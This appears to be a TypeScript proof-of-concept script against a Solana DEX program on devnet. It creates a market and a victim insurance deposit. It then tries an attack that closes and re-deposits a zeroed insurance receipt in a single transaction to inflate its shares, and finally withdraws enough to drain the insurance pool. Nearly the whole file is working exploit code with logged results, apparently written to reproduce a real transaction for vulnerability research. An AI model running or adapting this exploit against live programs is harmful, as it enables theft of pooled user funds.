import { Connection, Keypair, PublicKey, SystemProgram, Transaction, TransactionInstruction, sendAndConfirmTransaction } from "@solana/web3.js";
import { createMint, createAccount, mintTo } from "@solana/spl-token";
import * as fs from "fs";
import { LEAN_DEVNET, DEX_SIZE, MARKET_SIZE, INS_RECEIPT_SIZE, POS_SCALE, initDex, createMarket, depositInsurance, withdrawInsurance, closeAccount, deriveDexVault, parseInsReceipt, parseMarket, type MarketParams, type VaultAccounts } from "../src/lean/index.js";
const conn=new Connection(process.env.SOLANA_RPC_URL ?? "https://api.devnet.solana.com","confirmed");
const P=LEAN_DEVNET.percolator;
const funder=Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(`${process.env.HOME}/.config/solana/id.json`,"utf8"))));
async function send(ixs:TransactionInstruction[],s:Keypair[]=[]){for(let i=0;;i++){try{return await sendAndConfirmTransaction(conn,new Transaction().add(...ixs),[funder,...s],{commitment:"confirmed"});}catch(e){if(i<6&&/429|Too Many|block height|timed out/i.test(String(e))){await new Promise(r=>setTimeout(r,1500*(i+1)));continue;}throw e;}}}
async function newAcc(o:PublicKey,sz:number){const kp=Keypair.generate();const lam=await conn.getMinimumBalanceForRentExemption(sz);await send([SystemProgram.createAccount({fromPubkey:funder.publicKey,newAccountPubkey:kp.publicKey,lamports:lam,space:sz,programId:o})],[kp]);return kp;}
const rc=async(k:PublicKey)=>{const i=await conn.getAccountInfo(k);return i?parseInsReceipt(Buffer.from(i.data)):null;};
const ms=async(m:PublicKey)=>parseMarket(Buffer.from((await conn.getAccountInfo(m))!.data));
async function main(){
  const mint=await createMint(conn,funder,funder.publicKey,null,6);
  const feeVault=await createAccount(conn,funder,mint,funder.publicKey,Keypair.generate());
  const fTok=await createAccount(conn,funder,mint,funder.publicKey,Keypair.generate());
  await mintTo(conn,funder,mint,fTok,funder,1000n*POS_SCALE);
  const dex=(await newAcc(P,DEX_SIZE)).publicKey;
  await send([initDex(P,{dex,admin:funder.publicKey,mint,feeVault,decimals:6,createFee:0n})]);
  const V:VaultAccounts={dex,mint,vault:deriveDexVault(P,dex)[0]};
  const params:MarketParams={initPrice:100n*POS_SCALE,exitWindow:10n,maxStaleness:9000n,warmupSlots:0n,imBps:1000n,mmBps:500n,liqFeeBps:50n,tradeFeeBps:0n,maxMoveBps:100n,maxInsDrawBps:2500n,maxOi:1_000_000n*POS_SCALE,minMm:0n};
  const mkt=(await newAcc(P,MARKET_SIZE)).publicKey;
  await send([createMarket(P,{dex,market:mkt,mint,oracleAuth:Keypair.generate().publicKey,creator:funder.publicKey,creatorToken:fTok,feeVault,params})]);
  // victim seeds 70
  const rv=(await newAcc(P,INS_RECEIPT_SIZE)).publicKey;
  await send([depositInsurance(P,V,{market:mkt,receipt:rv,lp:funder.publicKey,sourceToken:fTok,amount:70n*POS_SCALE})]);
  // attacker receipt: deposit 5, withdraw all -> shares 0
  const ra=await newAcc(P,INS_RECEIPT_SIZE);
  await send([depositInsurance(P,V,{market:mkt,receipt:ra.publicKey,lp:funder.publicKey,sourceToken:fTok,amount:5n})]);
  const s1=(await rc(ra.publicKey))!.shares;
  await send([withdrawInsurance(P,V,{market:mkt,receipt:ra.publicKey,lp:funder.publicKey,destToken:fTok,burnShares:s1})]);
  console.log(`attacker receipt after dep5/withdraw-all: shares=${(await rc(ra.publicKey))!.shares}`);
  // THE ATTACK: CloseAccount(ra) + re-DepositInsurance(1) in ONE tx (mimics 4Znsq)
  try {
    await send([closeAccount(P,{account:ra.publicKey,authority:funder.publicKey,destination:funder.publicKey}),
                depositInsurance(P,V,{market:mkt,receipt:ra.publicKey,lp:funder.publicKey,sourceToken:fTok,amount:1n})],[]);
    const r=await rc(ra.publicKey); const m=await ms(mkt);
    console.log(`after CloseAccount+DepositIns(1) in 1 tx: receipt shares=${r?.shares}  market totalInsShares=${m.totalInsShares} insurance=${m.insurance}`);
    if(r && r.shares>1n){console.log(`*** INFLATION: receipt shares=${r.shares} > totalInsShares? ${r.shares>m.totalInsShares} ***`);
      try{await send([withdrawInsurance(P,V,{market:mkt,receipt:ra.publicKey,lp:funder.publicKey,destToken:fTok,burnShares:m.totalInsShares})]);const after=await ms(mkt);console.log(`drained: insurance ${Number(m.insurance)/1e6} -> ${Number(after.insurance)/1e6} USDC`);}catch(e){console.log("drain try:",String(e).slice(0,100));}
    } else console.log("no inflation via this exact path");
  } catch(e){console.log("close+redeposit failed:",String(e).slice(0,160));}
  process.exit(0);
}
main().catch(e=>{console.error(String(e).slice(0,400));process.exit(1);});
